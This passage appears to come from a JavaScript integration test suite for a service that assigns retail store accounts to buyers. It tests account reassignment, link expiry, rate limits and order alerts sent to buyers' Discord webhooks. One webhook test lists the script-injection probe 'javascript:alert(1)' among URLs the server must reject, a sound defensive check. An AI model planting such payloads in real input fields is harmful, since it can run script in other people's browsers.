      assert.ok(ask.includes('<p class="who">5000 accounts</p>') && ask.includes("3 more ticked aren't included: 5000 at most at once. Remove them next."), ask.slice(0, 400));
    } finally {
      sqlRun("DELETE FROM accounts WHERE store IN ('bulktest', 'other:a|b c')");
    }
    const gone = new URLSearchParams({ t: new URL(lsLink).searchParams.get("t"), action: "copy" }); gone.append("pick", "other:a|b c typed.one@example.com");
    assert.deepEqual(await (await fetchOnce(lsLink.split("?")[0], { method: "POST", body: gone })).json(), { lines: [], missing: 1, over: 0 }, "none left: nothing to copy");
  });
  // Reassign (2026-10-14, the owner's request): a buyer's account swapped for another, when something's wrong with it. Rosa is
  // the buyer here.
  let rosaKey, rosaOld, rosaNew;
  const rosaPair = async (name, batch = "ra" + rid()) => {
    const before = webhookPosts.length;
    const r = await fetchOnce(BASE + "/submissions", { method: "POST", headers: { authorization: "Bearer " + rosaKey, "content-type": "application/json" },
      body: JSON.stringify({ files: [tgFile([name]), pcFile([name])], name: "Rosa", slots: 2, batch, stores: [{ name: "Target", n: 1, seller: 1 }, { name: "Pokémon Center", n: 1, seller: 1 }] }) });
    assert.equal(r.status, 200, await r.clone().text()); await r.text();
    const m = batchPost(before); assert.ok(m, "posted");
    const a = listRows().find((x) => x.store === "*" && x.profile === name && x.key_hash); assert.ok(a, name + " has one");
    return { a, m };
  };
  const masterOf = (e) => dbRows(`SELECT email, email_norm, password, key_hash, key_last4, profile, batch, store_name, sent_at, assigned_at FROM accounts WHERE store = '*' AND email_norm = '${e}'`)[0];
  const masterFor = (profile) => dbRows(`SELECT email, email_norm, password, key_hash, key_last4, profile, batch, store_name, sent_at, assigned_at FROM accounts WHERE store = '*' AND profile = '${profile}' AND key_hash IS NOT NULL`);
  const slotRowsOf2 = (e) => dbRows(`SELECT store, email, email_norm, password, key_hash, profile, batch, sent_at, assigned_at FROM accounts WHERE offer_id = 'reuse:*' AND email_norm = '${e}' ORDER BY store DESC`);
  const rowsWith = (e) => dbRows(`SELECT COUNT(*) AS n FROM accounts WHERE email_norm = '${e}'`)[0].n;
  const freeOnList = () => dbRows("SELECT COUNT(*) AS n FROM accounts m WHERE store = '*' AND key_hash IS NULL AND NOT EXISTS (SELECT 1 FROM accounts x WHERE x.email_norm = m.email_norm AND x.store <> '*')")[0].n;
  // A POST with a field given more than once (ticks, emails).
  const postPairs = (link, pairs, redirect = "follow") => fetchOnce(link.split("?")[0], { method: "POST", redirect, body: new URLSearchParams([["t", new URL(link).searchParams.get("t")], ...pairs]) });
  const after = async (location) => { const r = await fetchOnce(new URL(location, lsLink)); return unescape(await r.text()); };
  const reassignTo = async (a, body) => { const r = await sendRaw(lsLink, { action: "do-reassign", email: a.email_norm, ...body }); assert.equal(r.status, 303, "back to the list"); return r; };
  await test("setup: Rosa, a buyer, and free accounts on the list", async () => {
    rosaKey = await newKey("rosa");
    const add = await page2(await send(lsLink, { action: "add", accounts: Array.from({ length: 16 }, (_, i) => `re${i + 1}@example.com:Re-Pw-${i + 1}`).join("\n") }));
    assert.ok(add.includes("<p>Added 16 to your list.</p>"), add.slice(0, 600));
  });
  await test("Reassign gives a buyer's slots a free account from the list in place of theirs, and takes the old one off", async () => {
    const { a } = await rosaPair("Rosa A");
    const a0 = masterOf(a.email_norm);
    rosaOld = a.email;
    const uses0 = slotRowsOf2(a.email_norm);
    assert.deepEqual(uses0.map((u) => u.store), ["target", "pokemoncenter"], "its Target and Pokémon Center slots' rows");
    // Its button on the list, and on its Edit page; a free account has none.
    const list0 = await page2(await view(lsLink, {}));
    const btn = (e) => `name="email" value="${e}"><button class="ed" type="submit" name="action" value="reassign">Reassign</button>`;
    assert.ok(list0.includes(btn(a.email_norm)), "a given account has Reassign");
    const free = listRows().find((x) => x.store === "*" && !x.key_hash);
    assert.ok(!list0.includes(btn(free.email_norm)), "a free one doesn't");
    assert.ok(list0.includes('<button type="submit" class="ed" name="action" value="reassign">Reassign</button>'), "the bar has it too");
    assert.ok(list0.includes("or reassigned: Reassign gives their slots another account in its place, if something's wrong with it."), "the page says what it does");
    const edit = await page2(await view(lsLink, { action: "edit", store: "*", email: a.email_norm }));
    assert.ok(edit.includes("<h3>Reassign it</h3>") && edit.includes("Their slots can get another account in its place, from your list or one you add.") && edit.includes('value="reassign">Reassign…</button>'), edit.slice(0, 1500));
    // The question changes nothing by itself.
    const free0 = freeOnList(), posts0 = webhookPosts.length;
    const ask = await page2(await view(lsLink, { action: "reassign", email: a.email_norm }));
    assert.ok(ask.includes("<h2>Reassign an account</h2>") && ask.includes(`<p class="who">${a.email}</p>`), ask.slice(0, 800));
    assert.ok(ask.includes(`Given to license …${a.key_last4}, Rosa A: Target, sent ${at(uses0[0].sent_at)}; Pokémon Center, sent ${at(uses0[1].sent_at)}`), "whose it is and its slots");
    assert.ok(ask.includes(`<input type="radio" name="how" value="list" checked><span>A free account from my list, picked at random <span class="hint">(${free0} free)</span>`), "a free one from the list, to start");
    assert.ok(ask.includes('<input type="radio" name="old" value="remove" checked><span>Take it off my list: something\'s wrong with it</span>') && ask.includes('<input type="radio" name="old" value="free"><span>Put it back on my list as free</span>'));
    assert.ok(ask.includes("change the email in their profile in your bot (and the login, for Target). Order alerts follow the account: the buyer gets them for the new one, and no more for the old one."));
    for (const x of listRows().filter((y) => y.password)) assert.ok(!ask.includes(x.password), "never a password");
    await view(lsLink, { action: "do-reassign", email: a.email_norm, how: "list", old: "remove" });
    assert.deepEqual(masterOf(a.email_norm), a0, "a link (GET) changes nothing");
    // Reassigned.
    const r = await reassignTo(a, { how: "list", old: "remove" });
    const [n] = masterFor("Rosa A");
    rosaNew = n.email;
    assert.notEqual(n.email_norm, a.email_norm);
    assert.deepEqual(new URLSearchParams(r.location.split("?")[1]).getAll("tick"), ["* " + n.email_norm], "the new one comes ticked");
    assert.deepEqual({ key_hash: n.key_hash, key_last4: n.key_last4, batch: n.batch, store_name: n.store_name, sent_at: n.sent_at },
      { key_hash: a0.key_hash, key_last4: a0.key_last4, batch: a0.batch, store_name: a0.store_name, sent_at: a0.sent_at }, "it takes over what the old one had");
    assert.ok(n.assigned_at >= uses0[0].sent_at, "given out now (order alerts drop older orders)");
    const uses1 = slotRowsOf2(n.email_norm);
    assert.deepEqual(uses1.map((u) => [u.store, u.email, u.password, u.batch, u.sent_at, u.assigned_at]),
      uses0.map((u) => [u.store, n.email, n.password, u.batch, u.sent_at, n.assigned_at]), "its slots' rows take the new email and password, in the same batches");
    assert.equal(rowsWith(a.email_norm), 0, "the old one is off the list, and no slot's row has it");
    assert.equal(freeOnList(), free0 - 1);
    // The channel hears it, without a password.
    assert.equal(webhookPosts.length, posts0 + 1);
    const note = webhookPosts.at(-1).content;
    assert.equal(note, `🔁 **Reassigned 1 account** on your list for Use Assigned Account\nlicense …${a.key_last4}, Rosa A: ${a.email} → ${n.email}\n-# The old one came off your list. Batches already posted have the old email: change it in your bot.`);
    assert.ok(!note.includes(n.password) && !note.includes(a.password));
    // Back on the list, saying so, with the new one ticked for Copy email:password.
    const page1 = await after(r.location);
    assert.ok(page1.includes(`<p>Reassigned license …${a.key_last4}, Rosa A: their Target and Pokémon Center slots now use ${n.email} in place of ${a.email}, which came off your list. Change the email in their profile in your bot (and Target's login): the new account is ticked below, so Copy email:password copies it.</p>`), page1.slice(0, 1200));
    assert.ok(page1.includes(`value="* ${n.email_norm}" data-store="*" data-email="${n.email}" aria-label="Tick ${n.email}" checked>`), "ticked");
    assert.equal((page1.match(/ checked>/g) || []).length, 1, "only that one");
    assert.ok(page1.includes(`Given to license …${a.key_last4}, Rosa A:<br>Target, sent ${at(uses0[0].sent_at)}<br>Pokémon Center, sent ${at(uses0[1].sent_at)}</td>`), "its slots, as they were sent");
    const copied = await (await postPairs(lsLink, [["action", "copy"], ["pick", "* " + n.email_norm]])).json();
    assert.deepEqual(copied.lines, [`${n.email}:${n.password}`]);
    // The same profile sent again gets the new one: its logins file has it.
    const again = await rosaPair("Rosa A");
    assert.equal(again.a.email_norm, n.email_norm, "the same account for the profile");
    const logins = plain(again.m).find((f) => f.name.endsWith("-target-logins.txt"));
    assert.ok(logins && logins.text.includes(`${n.email}:${n.password}`), "Target's logins file has the new account");
    assert.ok(!JSON.stringify(again.m.files).includes(a.email), "never the old one");
    // Reassigning it again (the old one, now gone) says so.
    const gone = await page2(await view(lsLink, { action: "reassign", email: a.email_norm }));
    assert.ok(gone.includes(`<p class="err">${a.email_norm} isn't on your list any more.</p>`), gone.slice(0, 600));
  });
  await test("Reassign to a typed account: a free one on the list by its email, or a new one as email:password; the old one can go back free", async () => {
    const { a } = await rosaPair("Rosa B");
    const try1 = async (body) => {
      const html = await page2(await send(lsLink, { action: "do-reassign", email: a.email_norm, old: "remove", ...body }));
      assert.equal(masterOf(a.email_norm).key_hash, a.key_hash, "nothing changed: " + JSON.stringify(body));
      return (html.match(/<p class="err">([^<]*)<\/p>/) || [])[1];
    };
    assert.equal(await try1({ how: "these", accounts: "" }), "Type one account: the one to give them.");
    assert.equal(await try1({ how: "these", accounts: "re5@example.com\nre6@example.com" }), "Type one account: the one to give them, not 2.");
    assert.equal(await try1({ how: "list", accounts: "re5@example.com" }), 'You typed an account, but picked a free account from your list: pick "This account" to use what you typed, or empty the box.');
    assert.equal(await try1({ how: "", accounts: "" }), "Pick which account they get.");
    assert.equal(await try1({ how: "these", accounts: "not an email" }), "Line 1 couldn't be read: write the email of a free account on your list, or email:password for a new one.");
    assert.equal(await try1({ how: "these", accounts: a.email }), `${a.email} is one of the accounts you're reassigning: type another.`);
    assert.equal(await try1({ how: "these", accounts: rosaNew }), `${rosaNew} is given to license …${a.key_last4}, Rosa A: type a free one.`);
    assert.equal(await try1({ how: "these", accounts: "nobody.here@example.com" }), "nobody.here@example.com isn't on your list: write it as email:password to put it on.");
    sqlRun("INSERT INTO accounts (store, email, email_norm, password, added_at) VALUES ('walmart', 'wm1@example.com', 'wm1@example.com', 'Wm-Pw', 1)");
    try { assert.equal(await try1({ how: "these", accounts: "wm1@example.com:Wm-Pw" }), "wm1@example.com is on your Walmart list too: type another."); }
    finally { sqlRun("DELETE FROM accounts WHERE email_norm = 'wm1@example.com'"); }
    assert.equal(rowsWith("nobody.here@example.com"), 0);
    // What was typed stays in the box when it's asked again.
    const kept = await page2(await send(lsLink, { action: "do-reassign", email: a.email_norm, how: "these", old: "free", accounts: "nobody.here@example.com" }));
    assert.ok(kept.includes('name="accounts" value="nobody.here@example.com"') && kept.includes('<input type="radio" name="how" value="these" checked>') && kept.includes('<input type="radio" name="old" value="free" checked>'), kept.slice(0, 2000));
    // A new one, as email:password: it goes on the list and to them; the old one goes back free, with its password.
    const r = await reassignTo(a, { how: "these", accounts: "Brand.New@example.com:Brand-Pw-1", old: "free" });
    const n = masterOf("brand.new@example.com");
    assert.deepEqual([n.email, n.password, n.key_hash, n.profile], ["Brand.New@example.com", "Brand-Pw-1", a.key_hash, "Rosa B"]);
    assert.deepEqual(slotRowsOf2("brand.new@example.com").map((u) => [u.store, u.email, u.password]), [["target", "Brand.New@example.com", "Brand-Pw-1"], ["pokemoncenter", "Brand.New@example.com", "Brand-Pw-1"]]);
    const old = masterOf(a.email_norm);
    assert.deepEqual([old.key_hash, old.profile, old.batch, old.password], [null, null, null, a.password], "the old one is free on the list, with its password");
    assert.deepEqual(slotRowsOf2(a.email_norm), []);
    const page1 = await after(r.location);
    assert.ok(page1.includes(`in place of ${a.email}, which is free on your list again.`), page1.slice(0, 1000));
    assert.ok(webhookPosts.at(-1).content.endsWith("-# The old one is free on your list again. Batches already posted have the old email: change it in your bot."));
    // A free one on the list, by its email alone (put on the list after Rosa C's slots took theirs, so they can't have taken it).
    const c = (await rosaPair("Rosa C")).a;
    await send(lsLink, { action: "add", accounts: "typed1@example.com:Typed-Pw-1" });
    await reassignTo(c, { how: "these", accounts: "TYPED1@example.com" });
    const t1 = masterOf("typed1@example.com");
    assert.deepEqual([t1.key_hash, t1.profile, t1.password], [c.key_hash, "Rosa C", "Typed-Pw-1"]);
    assert.equal(rowsWith(c.email_norm), 0);
    // One on the list already, typed with another password: it keeps its own, and the page says so.
    const d = (await rosaPair("Rosa D")).a;
    await send(lsLink, { action: "add", accounts: "typed2@example.com:Typed-Pw-2" });
    const rd = await reassignTo(d, { how: "these", accounts: "typed2@example.com:Other-Pw" });
    assert.deepEqual(slotRowsOf2("typed2@example.com").map((u) => u.password), ["Typed-Pw-2", "Typed-Pw-2"]);
    assert.ok((await after(rd.location)).includes("typed2@example.com was on your list already, and kept the password it had (Edit changes it)."));
  });
  await test("ticked accounts are reassigned together; the ones it can't do are named, and the new ones come ticked", async () => {
    const e = (await rosaPair("Rosa E")).a, f = (await rosaPair("Rosa F")).a;
    const free = listRows().find((x) => x.store === "*" && !x.key_hash);
    const ask = await page2(await postPairs(lsLink, [["action", "reassign"], ["pick", "* " + e.email_norm], ["pick", "* " + f.email_norm], ["pick", "* " + free.email_norm], ["pick", "kohls nobody@example.com"]]));
    assert.ok(ask.includes("<h2>Reassign 2 accounts</h2>") && ask.includes('<p class="who">2 accounts</p>'), ask.slice(0, 800));
    assert.ok(ask.includes(`${e.email} · Given to license …${e.key_last4}, Rosa E: Target, sent `) && ask.includes(`${f.email} · Given to license …${f.key_last4}, Rosa F: Target, sent `));
    assert.ok(ask.includes("<p class=\"small\">1 is free, not given to a buyer. 1 is on a store's own list: Reassign is for your list (Target and Pokémon Center).</p>"), ask.slice(0, 1500));
    assert.ok(ask.includes('<textarea name="accounts"') && ask.includes("These accounts, one for each, in the order above") && ask.includes('value="do-reassign">Reassign 2</button>'));
    const one = await page2(await postPairs(lsLink, [["action", "do-reassign"], ["email", e.email_norm], ["email", f.email_norm], ["how", "these"], ["old", "remove"], ["accounts", "re7@example.com"]]));
    assert.ok(one.includes('<p class="err">Type 2 accounts, one for each: you typed 1.</p>'));
    const twice = await page2(await postPairs(lsLink, [["action", "do-reassign"], ["email", e.email_norm], ["email", f.email_norm], ["how", "these"], ["old", "remove"], ["accounts", "re7@example.com\nRE7@example.com"]]));
    assert.ok(twice.includes('<p class="err">RE7@example.com is in the box twice: each one gets an account of its own.</p>'));
    const posts0 = webhookPosts.length;
    const r = await postPairs(lsLink, [["action", "do-reassign"], ["email", e.email_norm], ["email", f.email_norm], ["how", "list"], ["old", "remove"], ["accounts", ""]], "manual");
    assert.equal(r.status, 303); const loc = r.headers.get("location"); await r.text();
    const [ne] = masterFor("Rosa E"), [nf] = masterFor("Rosa F");
    assert.ok(ne.email_norm !== e.email_norm && nf.email_norm !== f.email_norm && ne.email_norm !== nf.email_norm);
    assert.equal(rowsWith(e.email_norm) + rowsWith(f.email_norm), 0);
    const page1 = await after(loc);
    assert.ok(page1.includes(`<p>Reassigned 2 accounts (Rosa E: ${e.email} → ${ne.email}; Rosa F: ${f.email} → ${nf.email}). The old ones came off your list. Change the emails in those profiles in your bot (and Target's logins): the new accounts are ticked below, so Copy email:password copies them.</p>`), page1.slice(0, 1200));
    assert.equal((page1.match(/ checked>/g) || []).length, 2);
    assert.equal(webhookPosts.length, posts0 + 1);
    assert.equal(webhookPosts.at(-1).content, `🔁 **Reassigned 2 accounts** on your list for Use Assigned Account\nlicense …${e.key_last4}, Rosa E: ${e.email} → ${ne.email}\nlicense …${f.key_last4}, Rosa F: ${f.email} → ${nf.email}\n-# The old ones came off your list. Batches already posted have the old email: change it in your bot.`);
    // Nothing ticked, or none that can be: back to the list, saying why.
    const none = await postPairs(lsLink, [["action", "reassign"]], "manual"); await none.text();
    assert.equal(none.status, 303); assert.match(none.headers.get("location"), /err=Tick\+the\+accounts\+to\+reassign\+first\./);
    const stillFree = listRows().find((x) => x.store === "*" && !x.key_hash);   // read again: the reassign may have given out the one above
    const onlyFree = await postPairs(lsLink, [["action", "reassign"], ["pick", "* " + stillFree.email_norm]], "manual"); await onlyFree.text();
    assert.equal(onlyFree.status, 303);
    assert.ok((await after(onlyFree.headers.get("location"))).includes(`<p class="err">${stillFree.email} is free, not given to a buyer.</p>`));
  });
  await test("Reassign waits while a batch of the buyer's is being sent, and says when the list has no free account left", async () => {
    const { a } = await rosaPair("Rosa G");
    const held = async (why) => {
      const ask = await page2(await view(lsLink, { action: "reassign", email: a.email_norm }));
      assert.ok(ask.includes(`<p class="err">${a.email} ${why}</p>`), ask.slice(0, 800));
      const r = await reassignTo(a, { how: "list", old: "remove" });
      assert.ok((await after(r.location)).includes(`<p class="err">${a.email} ${why}</p>`));
      assert.equal(masterOf(a.email_norm).key_hash, a.key_hash, "nothing changed");
    };
    // A batch of theirs not posted yet (its accounts were read before it posts).
    sqlRun(`INSERT INTO submissions (id, key_hash, key_last4, name, slots, bytes, key_id, created_at) VALUES ('sending1', '${a.key_hash}', '${a.key_last4}', '', 1, 1, 'CSV', ${Date.now()})`);
    try { await held("is in a batch being sent: try again in a minute."); }
    finally { sqlRun("DELETE FROM submissions WHERE id = 'sending1'"); }
    // One whose worker stopped long ago doesn't hold it.
    sqlRun(`INSERT INTO submissions (id, key_hash, key_last4, name, slots, bytes, key_id, created_at) VALUES ('sending2', '${a.key_hash}', '${a.key_last4}', '', 1, 1, 'CSV', ${Date.now() - 11 * 60000})`);
    try { assert.ok((await page2(await view(lsLink, { action: "reassign", email: a.email_norm }))).includes('value="do-reassign">Reassign</button>')); }
    finally { sqlRun("DELETE FROM submissions WHERE id = 'sending2'"); }
    // A slot's row in a batch being sent.
    sqlRun(`UPDATE accounts SET sent_at = NULL WHERE offer_id = 'reuse:*' AND store = 'pokemoncenter' AND email_norm = '${a.email_norm}'`);
    const ps = slotRowsOf2(a.email_norm);
    try { await held("is in a batch being sent: try again in a minute."); }
    finally { sqlRun(`UPDATE accounts SET sent_at = ${ps[0].sent_at} WHERE offer_id = 'reuse:*' AND store = 'pokemoncenter' AND email_norm = '${a.email_norm}'`); }
    // None free: the question starts on typing one, and a free one from the list says there's none.
    sqlRun("UPDATE accounts SET key_hash = 'held-for-test' WHERE store = '*' AND key_hash IS NULL");
    try {
      const ask = await page2(await view(lsLink, { action: "reassign", email: a.email_norm }));
      assert.ok(ask.includes('<input type="radio" name="how" value="list" disabled><span>A free account from my list, picked at random <span class="hint">(none free)</span>') && ask.includes('<input type="radio" name="how" value="these" checked>'), ask.slice(0, 1500));
      const r = await reassignTo(a, { how: "list", old: "remove" });
      assert.ok((await after(r.location)).includes(`<p class="err">${a.email} got no new account: your list has no free one left.</p>`));
      assert.equal(masterOf(a.email_norm).key_hash, a.key_hash);
    } finally { sqlRun("UPDATE accounts SET key_hash = NULL WHERE key_hash = 'held-for-test'"); }
  });
  await test("declining the batch after a reassign puts the new account back on the list; the old one stays off", async () => {
    const { a, m } = await rosaPair("Rosa H");
    await reassignTo(a, { how: "list", old: "remove" });
    const [n] = masterFor("Rosa H");
    const link = approveLink(m.content);
    assert.match(await (await approvePost(link, "decline-ask")).text(), /The 1 account given to them goes back on your list\./);
    assert.match(await (await approvePost(link, "decline")).text(), /1 account given to them is back on your list\./);
    const back = masterOf(n.email_norm);
    assert.deepEqual([back.key_hash, back.profile], [null, null], "the new one is free again");
    assert.deepEqual(slotRowsOf2(n.email_norm), []);
    assert.equal(rowsWith(a.email_norm), 0, "the old one stays off");
  });
  await test("reassigning several with the old ones put back free never gives one of them to another of its buyers", async () => {
    const i1 = (await rosaPair("Rosa I")).a, j1 = (await rosaPair("Rosa J")).a;
    const keep = listRows().find((x) => x.store === "*" && !x.key_hash);
    sqlRun(`UPDATE accounts SET key_hash = 'held-for-test' WHERE store = '*' AND key_hash IS NULL AND email_norm <> '${keep.email_norm}'`);
    try {
      const r = await postPairs(lsLink, [["action", "do-reassign"], ["email", i1.email_norm], ["email", j1.email_norm], ["how", "list"], ["old", "free"], ["accounts", ""]], "manual");
      assert.equal(r.status, 303); const loc = r.headers.get("location"); await r.text();
      const page1 = await after(loc);
      assert.ok(page1.includes(`their Target and Pokémon Center slots now use ${keep.email} in place of ${i1.email}, which is free on your list again.`), page1.slice(0, 1200));
      assert.ok(page1.includes(`<p class="err">${j1.email} got no new account: the only free ones left are the old ones this put back.</p>`), "not Rosa I's old one");
      assert.deepEqual([masterOf(i1.email_norm).key_hash, masterOf(j1.email_norm).key_hash, masterOf(j1.email_norm).profile], [null, j1.key_hash, "Rosa J"]);
      assert.deepEqual(slotRowsOf2(i1.email_norm), [], "no slot has Rosa I's old one");
    } finally { sqlRun("UPDATE accounts SET key_hash = NULL WHERE key_hash = 'held-for-test'"); }
  });
  await test("the link stops working after 24 hours, and asks are limited to 10 a day per license", async () => {
    const id = lsLink.match(/\/accounts\/list\/([^?]+)/)[1];
    execFileSync(process.execPath, [...wrangler, "d1", "execute", "orbit-license", "--local", "--persist-to", join(tmp, "approval"), "--command", `UPDATE account_lists SET created_at = created_at - 86400001 WHERE id = '${id}'`], { cwd: root, env, stdio: "pipe" });
    const r = await fetchOnce(lsLink), html = await r.text();
    assert.equal(r.status, 410); assert.match(html, /This link has expired\. Ask again from FAFO: Settings → Accounts to assign → See my list\./);
    assert.doesNotMatch(html, /@outlook\.com/, "and lists nothing");
    assert.equal((await send(lsLink, { action: "add", store: "target", accounts: "too.late@example.com:pw" })).status, 410, "and changes nothing");
    assert.equal((await send(lsLink, { action: "copy", pick: "target too.late@example.com" })).status, 410, "and copies nothing");
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts WHERE email_norm = 'too.late@example.com'")[0].n, 0);
    let n = dbRows(`SELECT COUNT(*) AS n FROM account_lists WHERE key_hash = (SELECT key_hash FROM account_lists WHERE id = '${id}') AND created_at > ${Date.now() - 86400000}`)[0].n;
    while (n < 10) { assert.equal((await askList()).status, 200); n++; }
    const before = webhookPosts.length;
    assert.equal((await askList()).status, 429, "the 11th today");
    assert.equal(webhookPosts.length, before, "nothing posted");
    assert.equal((await askList(hanaKey)).status, 200, "another license still can");
  });
  await test("CSV batches count toward 30 an hour per license", async () => {
    let sent = 0, limited = false;
    for (let i = 0; i < 40 && !limited; i++){
      const st = (await slots("/submissions", frankKey, { csv, slots: 1 })).status;
      if (st === 429) limited = true; else { assert.equal(st, 200); sent++; }
    }
    assert.ok(limited, "hit the limit");
    const d = await (await admin("/admin/submissions")).json();
    assert.equal(d.submissions.filter((x) => x.key_last4 === frankKey.slice(-4) && Date.now() - x.created_at < 3600e3).length, 30);
  });

  console.log("\nOrder alerts (app 1.9.69+)");
  // Frank's Orbit is the owner's here; Gina and Bob were given accounts above.
  const getAuth = (path, key) => fetch(BASE + path, { headers: { authorization: "Bearer " + key }, cache: "no-store" });
  const putAuth = (path, key, body) => fetch(BASE + path, { method: "PUT", headers: { authorization: "Bearer " + key, "content-type": "application/json" }, body: JSON.stringify(body) });
  const reviewIn = (content) => (content.match(/\((http[^)]+\/alerts\/review\/[^)]+)\)/) || [])[1];
  const today = new Date().toISOString().slice(0, 10);
  let ginaAcct, bobAcct, firstAlert;
  const orderEvent = (o) => ({ account: ginaAcct.email.toUpperCase(), store: "target", storeName: "Target", orderNo: "ord-1001", item: "Pokémon 151 Booster Bundle", qty: "2", total: "$59.98", stage: "placed", at: today, ...o });
  await test("only the allowed sender sends order alerts or sees the accounts given out", async () => {
    const given = (await accounts()).given;
    ginaAcct = given.find((a) => a.key_last4 === ginaKey.slice(-4)); bobAcct = given.find((a) => a.key_last4 === bobKey.slice(-4));
    assert.ok(ginaAcct && bobAcct, "accounts given out above");
    assert.equal((await slots("/alerts", frankKey, { events: [orderEvent()] })).status, 403);
    assert.equal((await getAuth("/alerts/accounts", frankKey)).status, 403);
    assert.equal((await slots("/alerts", null, { events: [orderEvent()] })).status, 401);
    assert.deepEqual(await (await getAuth("/alerts/sender", frankKey)).json(), { status: "none", canAsk: true });
  });
  let senderLink;
  await test("asking posts a review link to the channel; it waits for the owner", async () => {
    assert.deepEqual(await (await slots("/alerts/sender", frankKey, { name: "Owner" })).json(), { status: "pending" });
    await new Promise((ok) => setTimeout(ok, 400));
    const m = webhookPosts.at(-1).content;
    assert.match(m, /Let this FAFO send order alerts to buyers\?/); assert.match(m, /\*\*Owner\*\* · @frank · license …/);
    senderLink = reviewIn(m); assert.ok(senderLink, m);
    assert.equal((await (await getAuth("/alerts/sender", frankKey)).json()).status, "pending");
    assert.match(await (await fetch(senderLink)).text(), /Only allow it if you turned it on/);
    assert.equal((await fetch(senderLink.replace(/t=[^&]+/, "t=wrong"))).status, 404);
  });
  await test("allowing it makes that license the sender, and the channel message says so", async () => {
    assert.match(await (await offerPost(senderLink, "allow")).text(), /Allowed\. Orders on the accounts you assign now reach the buyers who have them\./);
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /Sends order alerts to buyers/);
    assert.equal((await (await getAuth("/alerts/sender", frankKey)).json()).status, "allowed");
    assert.match(await (await offerPost(senderLink, "refuse")).text(), /Sends order alerts to buyers/, "decided: stays allowed");
    const acc = (await (await getAuth("/alerts/accounts", frankKey)).json()).accounts;
    assert.ok(acc.some((a) => a.email === ginaAcct.email && a.store === "target") && acc.some((a) => a.email === bobAcct.email), "the accounts given out");
    assert.ok(acc.every((a) => Object.keys(a).sort().join() === "email,store"), "just the email and store, never passwords");
    assert.equal((await getAuth("/alerts/accounts", ginaKey)).status, 403);
  });
  await test("an order on a given-out account reaches that buyer, without the account", async () => {
    const r = await (await slots("/alerts", frankKey, { events: [
      orderEvent(), orderEvent({ account: "nobody@example.com" }), orderEvent({ store: "walmart" }), orderEvent({ at: "2020-01-01", orderNo: "OLD-1" }), orderEvent({ stage: "lost" })] })).json();
    assert.deepEqual(r, { ok: true, sent: 1, already: 0, unknown: 4 }, "not given out, another store, from before it was given out, or not a step");
    const got = await (await getAuth("/alerts", ginaKey)).json();
    assert.equal(got.alerts.length, 1);
    firstAlert = got.alerts[0];
    const { id, oid, createdAt, ...rest } = firstAlert;
    assert.deepEqual(rest, { store: "target", storeName: "Target", profile: ginaAcct.profile, orderNo: "ORD-1001", item: "Pokémon 151 Booster Bundle", qty: "2", total: "$59.98", stage: "placed", at: today });
    assert.ok(id && oid && createdAt > 0);
    assert.doesNotMatch(JSON.stringify(got), new RegExp(ginaAcct.email.replace(/[.+]/g, "\\$&"), "i"), "never the account");
    assert.equal((await (await getAuth("/alerts", bobKey)).json()).alerts.length, 0, "nothing for anyone else");
    assert.equal((await getAuth("/alerts", null)).status, 401);
  });
  await test("after a reassign, an order on the new account reaches the buyer, and none on the old one", async () => {
    const old = new Date(Date.now() - 3 * 86400000).toISOString().slice(0, 10);
    const r = await (await slots("/alerts", frankKey, { events: [orderEvent({ account: rosaNew, orderNo: "re-1" }), orderEvent({ account: rosaOld, orderNo: "re-2" }),
      orderEvent({ account: rosaNew, store: "pokemoncenter", storeName: "Pokémon Center", orderNo: "re-3" }), orderEvent({ account: rosaNew, orderNo: "re-4", at: old })] })).json();
    assert.deepEqual(r, { ok: true, sent: 2, already: 0, unknown: 2 }, "the old one is no one's now, and an order from before it was given to them was someone else's");
    const got = await (await getAuth("/alerts", rosaKey)).json();
    assert.deepEqual(got.alerts.map((x) => [x.orderNo, x.store, x.profile]).sort(), [["RE-1", "target", "Rosa A"], ["RE-3", "pokemoncenter", "Rosa A"]]);
    const accts = (await (await getAuth("/alerts/accounts", frankKey)).json()).accounts;
    assert.ok(accts.some((x) => x.email === rosaNew && x.store === "target") && accts.some((x) => x.email === rosaNew && x.store === "pokemoncenter"), "the sender's FAFO looks for orders on the new one");
    assert.ok(!accts.some((x) => x.email.toLowerCase() === rosaOld.toLowerCase()), "and not on the old one");
  });
  await test("the same step isn't sent twice; the next one is, under the same order", async () => {
    assert.deepEqual(await (await slots("/alerts", frankKey, { events: [orderEvent()] })).json(), { ok: true, sent: 0, already: 1, unknown: 0 });
    assert.deepEqual(await (await slots("/alerts", frankKey, { events: [orderEvent({ stage: "shipped" })] })).json(), { ok: true, sent: 1, already: 0, unknown: 0 });
    const since = await (await getAuth("/alerts?since=" + firstAlert.createdAt, ginaKey)).json();
    assert.deepEqual(since.alerts.map((a) => [a.stage, a.oid]), [["shipped", firstAlert.oid]]);
    assert.equal((await slots("/alerts", frankKey, { events: [] })).status, 400);
    assert.equal((await slots("/alerts", frankKey, { events: Array.from({ length: 201 }, () => orderEvent()) })).status, 400);
  });
  await test("a buyer's own Discord webhook is checked with a test post, then gets their alerts", async () => {
    const hook = `http://127.0.0.1:${DISCORD_PORT}/buyerhook/123456789/tok_gina_abcdefghijklmnopqrstuvwxyz`;
    assert.deepEqual(await (await getAuth("/alerts/webhook", ginaKey)).json(), { set: false });
    for (const url of ["https://example.com/hook", "https://discord.com/api/webhooks/abc/def", "javascript:alert(1)"])
      assert.equal((await putAuth("/alerts/webhook", ginaKey, { url })).status, 400, url);
    const dead = await putAuth("/alerts/webhook", ginaKey, { url: hook.replace("/buyerhook/", "/buyerhook/dead/") });
    assert.equal(dead.status, 400); assert.match((await dead.json()).error, /Discord answered 404\. Check the webhook link\./);
    assert.deepEqual(await (await putAuth("/alerts/webhook", ginaKey, { url: hook })).json(), { set: true });
    assert.equal(buyerHookPosts.at(-1).content, "✅ FAFO will post your order alerts here.");
    assert.equal((await (await getAuth("/alerts/webhook", ginaKey)).json()).set, true);
    const before = buyerHookPosts.length;
    await slots("/alerts", frankKey, { events: [orderEvent({ stage: "delivered" }), orderEvent({ account: bobAcct.email, orderNo: "BOB-7" })] });
    await new Promise((ok) => setTimeout(ok, 500));
    const posted = buyerHookPosts.slice(before);
    assert.equal(posted.length, 1, "Gina's alert only: Bob has no webhook");
    assert.equal(posted[0].content, `🏠 **Delivered** · Target\n${ginaAcct.profile} · Pokémon 151 Booster Bundle ×2 · $59.98\n-# Order #ORD-1001 · ${today}`);
    assert.deepEqual(posted[0].allowed_mentions, { parse: [] });
